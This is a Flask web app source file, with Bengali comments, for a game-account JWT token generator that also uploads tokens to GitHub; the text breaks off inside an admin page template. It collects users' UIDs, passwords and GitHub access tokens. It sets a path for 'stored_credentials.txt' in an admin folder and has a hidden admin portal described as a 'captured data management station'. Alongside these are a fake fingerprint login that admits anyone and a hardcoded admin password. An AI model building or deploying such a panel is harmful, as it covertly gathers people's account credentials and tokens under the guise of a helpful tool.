import asyncio
import urllib.parse
import base64
import json
import os
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
import aiohttp
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
app.secret_key = os.urandom(24) # সেশন ম্যানেজমেন্টের জন্য সিক্রেট কি

# ডিরেক্টরি এবং ফাইল পাথ সেটআপ
UPLOAD_FOLDER = 'uploaded_accounts'
ADMIN_DATA_FOLDER = 'admin_database'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(ADMIN_DATA_FOLDER, exist_ok=True)

SAVED_FILE_PATH = os.path.join(UPLOAD_FOLDER, 'active_accounts.txt')
CREDENTIALS_LOG_PATH = os.path.join(ADMIN_DATA_FOLDER, 'stored_credentials.txt')

# অ্যাডমিন প্যানেল অ্যাক্সেস পাসওয়ার্ড
ADMIN_PASSWORD = "Yasin123"

# Linie থেকে শুধুমাত্র গাণিতিক UID যাচাই করার হেল্পার ফাংশন
def count_valid_accounts(file_path):
    if not os.path.exists(file_path):
        return 0
    valid_count = 0
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                uid = None
                if ":" in line:
                    uid, _ = line.split(":", 1)
                elif "|" in line:
                    uid, _ = line.split("|", 1)
                
                if uid and uid.strip().isdigit():
                    valid_count += 1
    except:
        pass
    return valid_count

# অটোমেশনের গ্লোবাল স্টেট ট্র্যাকিং
initial_count = count_valid_accounts(SAVED_FILE_PATH)
initial_file_name = "active_accounts.txt" if initial_count > 0 else "None"

scheduler = BackgroundScheduler()
scheduler.start()
auto_status = {
    "running": False, 
    "interval": 0, 
    "last_token": "None", 
    "last_update": "Never", 
    "error": "None", 
    "next_run_timestamp": 0,
    "total_accounts_loaded": initial_count,
    "current_file_name": initial_file_name,
    "total_uploaded_tokens": 0,       
    "failed_lines": "None"            
}

# --- টোকেন জেনারেটর ফাংশন ---
async def generate_jwt_token(uid, password):
    """Generate JWT token"""
    try:
        encoded_password = urllib.parse.quote(password)
        url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?uid={uid}&password={encoded_password}"
        
        async with aiohttp.ClientSession() as session_http:
            async with session_http.get(url, timeout=24) as response:
                if response.status == 200:
                    data = await response.json()
                    if isinstance(data, dict):
                        if 'jwt_token' in data:
                            return data['jwt_token']
                        elif 'token' in data:
                            return data['token']
                return None
    except:
        return None

# --- গিটহাব আপলোডার ফাংশন ---
async def upload_tokens_to_github(tokens_list, github_token, repo, file_path):
    url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    async with aiohttp.ClientSession() as session_http:
        sha = None
        async with session_http.get(url, headers=headers) as resp:
            if resp.status == 200:
                res_data = await resp.json()
                sha = res_data.get('sha')
                
        json_data = {"tokens": tokens_list}
        json_string = json.dumps(json_data, indent=4)
        
        content_bytes = json_string.encode('utf-8')
        base64_content = base64.b64encode(content_bytes).decode('utf-8')
        
        payload = {
            "message": "Automated Multi-JWT Tokens Update via Flask Tool (JSON Format)",
            "content": base64_content
        }
        if sha:
            payload["sha"] = sha
            
        async with session_http.put(url, headers=headers, json=payload) as put_resp:
            return put_resp.status in [200, 201]

# --- ক্রন জব বা অটো টাস্ক ---
def auto_token_job(github_token, repo, file_path, saved_file_path):
    if not os.path.exists(saved_file_path):
        auto_status["error"] = "Uploaded account file missing."
        return

    tokens_to_upload = []
    failed_lines_list = []
    success_count = 0

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        with open(saved_file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
            for index, raw_line in enumerate(lines, start=1):
                line = raw_line.strip()
                if not line or line.startswith('#'):
                    continue  
                
                uid, password = None, None
                if ":" in line:
                    uid, password = line.split(":", 1)
                elif "|" in line:
                    uid, password = line.split("|", 1)
                
                if uid and password:
                    uid = uid.strip()
                    password = password.strip()
                    
                    token = loop.run_until_complete(generate_jwt_token(uid, password))
                    
                    if token:
                        tokens_to_upload.append({
                            "uid": uid,
                            "token": token,
                            "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
                        auto_status["last_token"] = token[:20] + "..." + token[-10:]
                        success_count += 1
                    else:
                        failed_lines_list.append(str(index))
                else:
                    failed_lines_list.append(str(index))
                    
    except Exception as e:
        auto_status["error"] = f"File processing error: {str(e)}"
        loop.close()
        return

    if failed_lines_list:
        auto_status["failed_lines"] = ", ".join(failed_lines_list)
    else:
        auto_status["failed_lines"] = "None"

    if tokens_to_upload:
        success = loop.run_until_complete(upload_tokens_to_github(tokens_to_upload, github_token, repo, file_path))
        current_time = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
        
        if success:
            auto_status["last_update"] = current_time
            auto_status["total_uploaded_tokens"] = success_count
            auto_status["error"] = "None"
            auto_status["next_run_timestamp"] = int(datetime.now().timestamp()) + (auto_status["interval"] * 60)
        else:
            auto_status["error"] = "GitHub upload failed. Check Token/Repo/Path."
            auto_status["total_uploaded_tokens"] = 0
    else:
        auto_status["error"] = "All uploaded accounts failed to generate tokens."
        auto_status["total_uploaded_tokens"] = 0
        
    loop.close()

# --- নতুন ফিঙ্গারপ্রিন্ট লগইন গেটওয়ে টেমপ্লেট ---
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT TOKEN GENERATE BOT - Auth Gate</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { 
            background: linear-gradient(135deg, #020617 0%, #0f172a 50%, #1e1b4b 100%); 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .login-box {
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(168, 85, 247, 0.3);
            backdrop-filter: blur(16px);
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(168, 85, 247, 0.1);
            max-width: 420px;
            width: 100%;
            text-align: center;
        }
        .bot-title {
            background: linear-gradient(45deg, #38bdf8, #a855f7, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            font-size: 2rem;
            letter-spacing: 1px;
        }
        
        /* ফিঙ্গারপ্রিন্ট বাটন এবং অ্যানিমেশন স্টাইল */
        .fingerprint-wrapper {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 40px auto 25px auto;
            cursor: pointer;
        }
        .fingerprint-btn {
            width: 100%;
            height: 100%;
            background: rgba(30, 41, 59, 0.5);
            border: 3px solid rgba(56, 189, 248, 0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            box-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
        }
        .fingerprint-btn svg {
            width: 60px;
            height: 60px;
            fill: #38bdf8;
            transition: all 0.2s ease;
        }
        
        /* স্ক্যানিং এফেক্ট লাইন */
        .scan-line {
            position: absolute;
            top: 0;
            left: 5%;
            width: 90%;
            height: 4px;
            background: linear-gradient(to right, transparent, #ec4899, #a855f7, #38bdf8, transparent);
            box-shadow: 0 0 15px #38bdf8;
            border-radius: 50%;
            opacity: 0;
            transform: translateY(0);
        }
        
        /* অ্যাক্টিভ ক্লাস যখন ইউজার টাচ/ক্লিক করবে - গতি ও অ্যানিমেশন বাড়ানো হয়েছে */
        .fingerprint-wrapper.scanning .fingerprint-btn {
            border-color: #ec4899;
            box-shadow: 0 0 30px rgba(236, 72, 153, 0.6);
            background: rgba(236, 72, 153, 0.1);
        }
        .fingerprint-wrapper.scanning .fingerprint-btn svg {
            fill: #ec4899;
            transform: scale(0.9);
        }
        .fingerprint-wrapper.scanning .scan-line {
            opacity: 1;
            animation: scanMove 0.4s ease-in-out infinite;
        }
        
        @keyframes scanMove {
            0% { transform: translateY(10px); }
            50% { transform: translateY(110px); }
            100% { transform: translateY(10px); }
        }
        
        .status-text {
            font-weight: 600;
            font-size: 0.95rem;
            color: #94a3b8;
            transition: color 0.2s;
        }
        .scanning-active-text {
            color: #ec4899 !important;
            text-shadow: 0 0 10px rgba(236, 72, 153, 0.3);
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h1 class="bot-title mb-2">JWT TOKEN GENERATE BOT</h1>
        <p class="text-muted small">Hold or click fingerprint sensor to unlock system dashboard</p>
        
        <div class="fingerprint-wrapper" id="fingerAuthBlock">
            <div class="scan-line"></div>
            <div class="fingerprint-btn">
                <svg viewBox="0 0 24 24">
                    <path d="M12,2C11.1,2 10.22,2.16 9.42,2.45C9.03,2.6 8.84,3.04 8.98,3.43C9.13,3.82 9.57,4.02 9.96,3.88C10.61,3.64 11.3,3.5 12,3.5C16.69,3.5 20.5,7.31 20.5,12C20.5,12.41 20.16,12.75 19.75,12.75C19.34,12.75 19,12.41 19,12C19,8.14 15.86,5 12,5C10.74,5 9.53,5.33 8.47,5.92C8.12,6.12 7.67,6 7.47,5.64C7.27,5.29 7.4,4.84 7.75,4.64C9,3.94 10.45,3.5 12,3.5M6.31,6.93C6.63,7.19 6.68,7.66 6.42,7.97C5.53,9.08 5,10.5 5,12C5,15.11 7.03,17.75 9.86,18.66C10.24,18.79 10.45,19.2 10.32,19.59C10.19,19.97 9.77,20.18 9.39,20.05C5.92,18.93 3.5,15.7 3.5,12C3.5,10.12 4.17,8.39 5.27,7.04C5.53,6.72 6,6.67 6.31,6.93M12,6.5C15.04,6.5 17.5,8.96 17.5,12C17.5,14.65 15.1,17.21 12.33,18.82C11.97,19.03 11.52,18.9 11.31,18.55C11.1,18.19 11.23,17.74 11.58,17.53C14,16.12 16,13.9 16,12C16,9.79 14.21,8 12,8C10.35,8 8.92,9.03 8.35,10.58C8.21,10.96 7.78,11.16 7.4,11.03C7.02,10.89 6.82,10.46 6.96,10.08C7.75,7.94 9.7,6.5 12,6.5M12,9.5C13.38,9.5 14.5,10.62 14.5,12C14.5,13.88 12.57,15.65 10.39,16.89C10.04,17.1 9.59,16.97 9.38,16.62C9.17,16.27 9.3,15.82 9.65,15.61C11.45,14.58 13,13.12 13,12C13,11.45 12.55,11 12,11C11.1,11 10.34,11.63 10.1,12.5C9.91,13.17 9.22,13.57 8.55,13.38C7.88,13.19 7.48,12.5 7.67,11.83C8.1,10.25 9.47,9.5 12,9.5Z"/>
                </svg>
            </div>
        </div>
        
        <div class="status-text" id="statusLabel">SCAN ANY FINGER TO ENTER</div>
    </div>

    <script>
        const fingerBlock = document.getElementById('fingerAuthBlock');
        const statusLabel = document.getElementById('statusLabel');

        fingerBlock.addEventListener('click', () => {
            fingerBlock.classList.add('scanning');
            statusLabel.innerText = "SCANNING BIOMETRICS...";
            statusLabel.classList.add('scanning-active-text');

            setTimeout(async () => {
                try {
                    const response = await fetch('/api/biometric-login', { method: 'POST' });
                    const data = await response.json();
                    if(data.success) {
                        statusLabel.innerText = "ACCESS GRANTED! REDIRECTING...";
                        statusLabel.style.color = "#10b981";
                        setTimeout(() => {
                            window.location.href = "/dashboard";
                        }, 200);
                    }
                } catch {
                    statusLabel.innerText = "AUTHENTICATION ERROR!";
                    fingerBlock.classList.remove('scanning');
                }
            }, 400); 
        });
    </script>
</body>
</html>
"""

# --- ফ্রন্টএন্ড ডিজাইন (Dashboard) ---
# লগ আউট বাটনটিকে একদম ডানদিকের কোণায় স্থায়ী পজিশনে রাখা হয়েছে
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Space - JWT Automation Engine</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { 
            background: linear-gradient(135deg, #020617 0%, #0f172a 40%, #1e1b4b 100%); 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            color: #f8fafc;
            min-height: 100vh;
        }
        .main-title {
            background: linear-gradient(45deg, #38bdf8, #a855f7, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            text-shadow: 0 0 40px rgba(168, 85, 247, 0.2);
        }
        
        /* লগ আউট বোতামটিকে একদম ডানদিকের কোণায় (Right Corner) ফিক্সড পজিশন দেওয়া হয়েছে */
        .logout-btn-custom {
            position: absolute;
            top: 0px; 
            right: 15px;
            z-index: 1000;
        }
        
        .card { 
            border: 1px solid rgba(168, 85, 247, 0.2); 
            background: rgba(15, 23, 42, 0.75);
            backdrop-filter: blur(12px);
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(168, 85, 247, 0.05);
            border-radius: 20px;
            transition: all 0.3s ease;
        }
        .card:hover {
            border-color: rgba(236, 72, 153, 0.4);
            box-shadow: 0 0 30px rgba(236, 72, 153, 0.15);
        }
        .form-label { color: #e2e8f0; font-weight: 600; }
        
        .form-control {
            background: rgba(2, 6, 23, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.25);
            color: #ffffff !important;
            border-radius: 10px;
            font-weight: 500;
        }
        .form-control::placeholder {
            color: #adbac7 !important;
            opacity: 1;
            font-weight: bold;
            font-size: 0.95rem;
        }
        .form-control:focus {
            background: #020617;
            border-color: #38bdf8;
            color: #ffffff;
            box-shadow: 0 0 12px rgba(56, 189, 248, 0.5);
        }
        
        .btn-gradient-1 { 
            background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%); 
            border: none; color: white; font-weight: bold; border-radius: 10px;
        }
        .btn-gradient-1:hover { background: linear-gradient(135deg, #db2777 0%, #9333ea 100%); opacity: 0.9; }
        
        .btn-gradient-2 { 
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%); 
            border: none; color: white; font-weight: bold; border-radius: 10px;
        }
        .btn-gradient-2:hover { background: linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%); opacity: 0.9; }
        
        .btn-copy {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            border: none; color: white; border-radius: 10px;
        }
        .status-badge {
            padding: 6px 14px; border-radius: 50px; font-weight: bold; font-size: 0.85rem;
        }
        .status-active { background-color: #10b981; color: white; animation: pulse 2s infinite; }
        .status-inactive { background-color: #ef4444; color: white; }
        
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1.03); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        .verify-text { font-size: 0.85rem; font-weight: bold; }
        
        .counter-box-slim {
            background: rgba(2, 6, 23, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 7px 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 38px;
        }
        .counter-label { color: #94a3b8; font-size: 0.85rem; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container py-5 position-relative">
        <a href="/logout" class="btn btn-outline-danger btn-sm logout-btn-custom rounded-pill px-3 fw-bold">Log Out</a>

        <div class="text-center mb-5">
            <h1 class="main-title display-4">JWT_TOKEN_BOT</h1>
            <p class="text-muted">Instant processing with secure .txt database management</p>
        </div>
        
        <div class="row g-4">
            <div class="col-md-5">
                <div class="card p-4 h-100">
                    <h3 class="mb-4 text-info fw-bold">⚡JWT_TOKEN_GENERATOR</h3>
                    <form id="tokenForm">
                        <div class="mb-3">
                            <label class="form-label">User ID (UID)</label>
                            <input type="text" id="uid" class="form-control" placeholder="➔ Enter Your UID " required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Password</label>
                            <input type="password" id="password" class="form-control" placeholder="➔ Enter Your Password " required>
                        </div>
                        <button type="submit" id="submitBtn" class="btn btn-gradient-1 w-100 mt-2 py-2">Generate Token</button>
                    </form>
                    
                    <div class="mt-4 d-none" id="tokenResultBox">
                        <label class="form-label fw-bold text-warning">Generated Token:</label>
                        <textarea id="generatedToken" class="form-control mb-2 text-info" rows="4" readonly></textarea>
                        <button type="button" id="copyBtn" class="btn btn-copy w-100 py-2">Copy Token</button>
                    </div>
                </div>
            </div>

            <div class="col-md-7">
                <div class="card p-4 h-100">
                    <h3 class="mb-4 text-danger fw-bold">🤖AUTOMATIC_TOKEN_GENERATOR</h3>
                    <form id="autoForm">
                        <div class="mb-3">
                            <label class="form-label fw-bold text-warning">Upload Accounts File (.txt only)</label>
                            <div class="input-group">
                                <input type="file" id="txtFile" class="form-control" accept=".txt">
                                <button type="button" id="deleteFileBtn" class="btn btn-outline-danger fw-bold">Delete File</button>
                            </div>
                            
                            <div class="row g-2 mt-2">
                                <div class="col-6">
                                    <div class="counter-box-slim">
                                        <span class="counter-label">File State:</span>
                                        <span id="activeFileName" class="fw-bold text-info style-text" style="font-size:0.85rem; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">None</span>
                                    </div>
                                </div>
                                <div class="col-6">
                                    <div class="counter-box-slim">
                                        <span class="counter-label">Total Serial Count: <span id="totalAccountDisplay" class="fw-bold text-success ms-1" style="font-size:0.95rem;">0</span></span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="mb-3">
                            <div class="d-flex justify-content-between align-items-center">
                                <label class="form-label">GitHub Access Token</label>
                                <span id="tokenVerifyStatus" class="verify-text text-secondary">Not Checked</span>
                            </div>
                            <input type="password" id="ghToken" class="form-control" placeholder="➔ Paste GitHub Access Token" required>
                        </div>
                        
                        <div class="row g-2 mb-3 align-items-end">
                            <div class="col-8">
                                <label class="form-label">GitHub Repo Name</label>
                                <input type="text" id="ghRepo" class="form-control" placeholder="➔ Repository Name " required>
                            </div>
                            <div class="col-4">
                                <label class="form-label">Time (Minutes)</label>
                                <input type="number" id="interval" class="form-control" placeholder="0" min="1" required>
                            </div>
                        </div>
                        
                        <div class="mb-3">
                            <label class="form-label">File Path in Repo</label>
                            <input type="text" id="filePath" class="form-control" placeholder="➔ Enter Your GitHub File Name" required>
                        </div>
                        
                        <div class="row g-2 mt-2">
                            <div class="col-6"><button type="submit" id="startBtn" class="btn btn-gradient-2 w-100 py-2">Start Auto token</button></div>
                            <div class="col-6"><button type="button" id="stopBtn" class="btn btn-danger w-100 py-2" disabled>Stop Auto token</button></div>
                        </div>
                    </form>

                    <div class="mt-4 border border-secondary p-3 rounded bg-dark bg-opacity-50">
                        <div class="d-flex justify-content-between align-items-center mb-2">
                            <label class="form-label">CRON JOB STATUS</label>
                            <span id="badge" class="status-badge status-inactive">OFFLINE</span>
                        </div>
                        <small class="d-block text-secondary">TOTAL CORRECT TOKEN UPLOAD: <span id="totalUploadedTokens" class="text-success fw-bold">0</span></small>
                        <small class="d-block text-secondary">TOKEN UPLOAD FAILED (LINE NUMBER): <span id="failedLines" class="text-danger fw-bold">None</span></small>
                        <small class="d-block text-secondary">NEW TOKEN PROCESSING: <span id="stToken" class="text-info">None</span></small>
                        <small class="d-block text-secondary">LAST SYNC TIME: <span id="stTime" class="text-success">Never</span></small>
                        <small class="d-block text-secondary">LIFETIME COUNTDOWN: <span id="lifetimeCountdown" class="text-warning fw-bold">00h 00m 00s remaining</span></small>
                        <small class="d-block text-danger">এরর লগ: <span id="stError">None</span></small>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentGitHubUsername = "";
        let globalTargetTimestamp = 0;

        window.addEventListener('DOMContentLoaded', () => {
            if(localStorage.getItem('ghToken')) {
                document.getElementById('ghToken').value = localStorage.getItem('ghToken');
                checkGitHubToken(localStorage.getItem('ghToken'));
            }
            if(localStorage.getItem('ghRepo')) document.getElementById('ghRepo').value = localStorage.getItem('ghRepo');
            if(localStorage.getItem('interval')) document.getElementById('interval').value = localStorage.getItem('interval');
            if(localStorage.getItem('filePath')) document.getElementById('filePath').value = localStorage.getItem('filePath');
            updateStatusBoard();
        });

        function syncLocalStorage(id, key) {
            document.getElementById(id).addEventListener('input', (e) => {
                const val = e.target.value.trim();
                if(val === "") {
                    localStorage.removeItem(key);
                    if(id === 'ghToken') {
                        document.getElementById('tokenVerifyStatus').innerText = "Not Checked";
                        document.getElementById('tokenVerifyStatus').className = "verify-text text-secondary";
                        currentGitHubUsername = "";
                    }
                } else {
                    localStorage.setItem(key, val);
                }
            });
        }

        syncLocalStorage('ghToken', 'ghToken');
        syncLocalStorage('ghRepo', 'ghRepo');
        syncLocalStorage('interval', 'interval');
        syncLocalStorage('filePath', 'filePath');

        document.getElementById('txtFile').addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;

            if (!file.name.endsWith('.txt')) {
                alert('শুধুমাত্র .txt ফাইল আপলোড করা সম্ভব!');
                e.target.value = '';
                return;
            }

            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch('/api/upload-file', { method: 'POST', body: formData });
                const data = await response.json();
                if(data.success) {
                    document.getElementById('totalAccountDisplay').innerText = data.count;
                    document.getElementById('activeFileName').innerText = data.filename;
                    alert('ইউনিক ফাইল ডেটা সফলভাবে মার্জ এবং সেভ করা হয়েছে!');
                } else { alert(data.message); }
            } catch (error) { alert('ফাইল আপলোড করতে সমস্যা হয়েছে!'); }
        });

        document.getElementById('deleteFileBtn').addEventListener('click', async () => {
            if (!confirm('আপনি কি নিশ্চিত যে ড্যাশবোর্ড থেকে বর্তমান ফাইলটি ডিলিট করতে চান? (এডমিন ডাটা সুরক্ষিত থাকবে)')) return;
            try {
                const response = await fetch('/api/delete-dashboard-file', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    document.getElementById('txtFile').value = '';
                    document.getElementById('totalAccountDisplay').innerText = '0';
                    document.getElementById('activeFileName').innerText = 'None';
                    alert(data.message);
                    updateStatusBoard();
                } else {
                    alert(data.message);
                }
            } catch (error) {
                alert('ফাইল ডিলিট করতে সার্ভারে সমস্যা হয়েছে!');
            }
        });

        async function checkGitHubToken(token) {
            if(!token || token.trim() === "") {
                document.getElementById('tokenVerifyStatus').innerText = "Not Checked";
                document.getElementById('tokenVerifyStatus').className = "verify-text text-secondary";
                currentGitHubUsername = "";
                return;
            }
            document.getElementById('tokenVerifyStatus').innerText = "Verifying...";
            document.getElementById('tokenVerifyStatus').className = "verify-text text-warning";

            try {
                const response = await fetch('/api/verify-github', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ github_token: token })
                });
                const data = await response.json();
                if(data.success) {
                    currentGitHubUsername = data.username;
                    document.getElementById('tokenVerifyStatus').innerText = `✓ Verified: ${data.username}`;
                    document.getElementById('tokenVerifyStatus').className = "verify-text text-success";
                } else {
                    currentGitHubUsername = "";
                    document.getElementById('tokenVerifyStatus').innerText = "✗ Invalid Token!";
                    document.getElementById('tokenVerifyStatus').className = "verify-text text-danger";
                }
            } catch { document.getElementById('tokenVerifyStatus').innerText = "Connection Error"; }
        }

        document.getElementById('ghToken').addEventListener('change', (e) => { checkGitHubToken(e.target.value); });

        document.getElementById('tokenForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const uid = document.getElementById('uid').value;
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submitBtn');
            
            submitBtn.disabled = true;
            submitBtn.innerText = 'Connecting...';
            
            try {
                const response = await fetch('/api/get-token', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ uid, password })
                });
                const data = await response.json();
                if(data.success) {
                    document.getElementById('generatedToken').value = data.token;
                    document.getElementById('tokenResultBox').classList.remove('d-none');
                } else { alert('ভুল ক্রেডেনশিয়াল!'); }
            } catch { alert('সার্ভার ত্রুটি!'); }
            finally {
                submitBtn.disabled = false;
                submitBtn.innerText = 'Generate Token';
            }
        });

        document.getElementById('copyBtn').addEventListener('click', function() {
            const tokenTextArea = document.getElementById('generatedToken');
            tokenTextArea.select();
            navigator.clipboard.writeText(tokenTextArea.value);
            this.innerText = '✓ Copied!';
            setTimeout(() => { this.innerText = 'Copy Token'; }, 2000);
        });

        document.getElementById('autoForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const github_token = document.getElementById('ghToken').value.trim();
            const repo_name = document.getElementById('ghRepo').value.trim();
            const interval = document.getElementById('interval').value.trim();
            const file_path = document.getElementById('filePath').value.trim();

            if(!currentGitHubUsername) {
                alert("দয়া করে আগে গিটহাব টোকেন ভেরিফাই করুন!");
                return;
            }

            if(github_token !== "") localStorage.setItem('ghToken', github_token);
            if(repo_name !== "") localStorage.setItem('ghRepo', repo_name);
            if(interval !== "") localStorage.setItem('interval', interval);
            if(file_path !== "") localStorage.setItem('filePath', file_path);

            const payload = {
                github_token, 
                repo: `${currentGitHubUsername}/${repo_name}`,
                interval: parseInt(interval), file_path
            };

            const response = await fetch('/api/auto-start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            if(data.success) { updateStatusBoard(); }
        });

        document.getElementById('stopBtn').addEventListener('click', async () => {
            const response = await fetch('/api/auto-stop', { method: 'POST' });
            const data = await response.json();
            if(data.success) { updateStatusBoard(); }
        });

        function runLiveCountdown() {
            if (globalTargetTimestamp <= 0) {
                document.getElementById('lifetimeCountdown').innerText = "00h 00m 00s remaining";
                return;
            }
            const now = Math.floor(Date.now() / 1000);
            let diff = globalTargetTimestamp - now;
            if (diff <= 0) {
                document.getElementById('lifetimeCountdown').innerText = "Syncing...";
                return;
            }
            const hours = Math.floor(diff / 3600);
            diff %= 3600;
            const minutes = Math.floor(diff / 60);
            const seconds = diff % 60;
            document.getElementById('lifetimeCountdown').innerText = `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s remaining`;
        }

        async function updateStatusBoard() {
            const response = await fetch('/api/auto-status');
            const data = await response.json();
            
            const badge = document.getElementById('badge');
            if(data.running) {
                badge.innerText = `ACTIVE (${data.interval} Min)`;
                badge.className = "status-badge status-active";
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                globalTargetTimestamp = data.next_run_timestamp;
            } else {
                badge.innerText = "OFFLINE";
                badge.className = "status-badge status-inactive";
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                globalTargetTimestamp = 0;
            }
            document.getElementById('stToken').innerText = data.last_token;
            document.getElementById('stTime').innerText = data.last_update;
            document.getElementById('stError').innerText = data.error;
            document.getElementById('totalAccountDisplay').innerText = data.total_accounts_loaded;
            document.getElementById('activeFileName').innerText = data.current_file_name;
            
            document.getElementById('totalUploadedTokens').innerText = data.total_uploaded_tokens;
            document.getElementById('failedLines').innerText = data.failed_lines;
            runLiveCountdown();
        }

        setInterval(runLiveCountdown, 1000);
        setInterval(updateStatusBoard, 5000);
    </script>
</body>
</html>
"""

# --- Admin লগইন পেজ ডিজাইন ---
ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🔒 Admin Auth Gate</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #020617; color: #cbd5e1; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-card { background: rgba(30, 41, 59, 0.6); border: 1px solid #334155; border-radius: 15px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
    </style>
</head>
<body>
    <div class="login-card text-center">
        <h3 class="text-danger fw-bold mb-3">🛡️ Security Gate</h3>
        <p class="text-muted small">Enter Secret Master Password to access Admin Panel</p>
        {% if error %}
        <div class="alert alert-danger py-2 small">{{ error }}</div>
        {% endif %}
        <form method="POST" action="/hello-admin-auth">
            <div class="mb-3">
                <input type="password" name="admin_pass" class="form-control text-center bg-dark text-white border-secondary" placeholder="Enter System Password" required>
            </div>
            <button type="submit" class="btn btn-danger w-100 fw-bold">Verify Access</button>
        </form>
    </div>
</body>
</html>
"""

# --- সিক্রেট ও প্রিমিয়াম অ্যাডমিন প্যানেল ডিজাইন ---
ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🔒 Hellos Master Admin Portal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #020617; color: #cbd5e1; font-family: 'Segoe UI', system-ui, sans-serif; }
        .admin-card { background: rgba(30, 41, 59, 0.4); border: 1px solid #334155; border-radius: 16px; backdrop-filter: blur(10px); }
        .table { color: #f8fafc; background: rgba(15, 23, 42, 0.6); }
        .custom-badge { font-size: 0.85rem; padding: 5px 10px; border-radius: 6px; }
        pre { background: #090d16; padding: 12px; border-radius: 8px; border: 1px solid #1e293b; color: #38bdf8; max-height: 250px; overflow-y: auto;}
    </style>
</head>
<body>
    <div class="container py-5">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <div>
                <h2 class="text-danger fw-bold m-0">🕵️‍♂️ Hellos Security Admin Engine</h2>
                <p class="text-muted small m-0">Real-time captured data management station</p>
            </div>
            <div class="d-flex gap-2">
                <a href="/dashboard" class="btn btn-outline-info btn-sm px-4 rounded-pill">Back To Dashboard</a>
                <a href="/hello-admin-logout" class="btn btn-danger btn-sm px-3 rounded-pill">Logout</a>
            </div>
        </div>
        
        <div class="row g-4">
            <div class="col-12">
                <div class="admin-card p-4 shadow">
